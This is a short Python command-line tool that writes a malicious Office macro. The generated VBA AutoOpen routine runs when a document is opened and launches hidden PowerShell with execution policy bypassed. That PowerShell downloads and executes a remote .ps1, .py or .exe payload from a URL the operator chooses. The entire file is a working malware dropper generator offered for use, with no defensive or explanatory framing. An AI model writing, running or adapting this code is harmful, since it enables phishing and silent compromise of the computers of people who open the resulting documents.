import argparse
import os

def generate_macro(ps_url: str) -> str:
    ext = os.path.splitext(ps_url)[1].lower()
    
    if ext == ".ps1":
        command = f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('{ps_url}')"
    elif ext == ".py":
        command = f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command $f = \"$env:TEMP\\script.py\"; (New-Object Net.WebClient).DownloadFile('{ps_url}', $f); python $f"
    elif ext == ".exe":
        command = f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command $f = \"$env:TEMP\\payload.exe\"; (New-Object Net.WebClient).DownloadFile('{ps_url}', $f); Start-Process $f"
    else:
        raise ValueError("Unsupported file type. Use .ps1, .py, or .exe")

    return f"""
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "{command}"
End Sub
"""

def main():
    parser = argparse.ArgumentParser(description="Generate Office Macro with .ps1, .py, or .exe URL payload")
    parser.add_argument("url", help="URL of the payload to download and execute (.ps1, .py, or .exe)")
    parser.add_argument("-o", "--output", default="macro.vba", help="Output macro filename (default: macro.vba)")
    args = parser.parse_args()

    try:
        macro_code = generate_macro(args.url)
        with open(args.output, "w") as f:
            f.write(macro_code)
        print(f"[+] Macro payload generated and saved to {args.output}")
    except ValueError as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
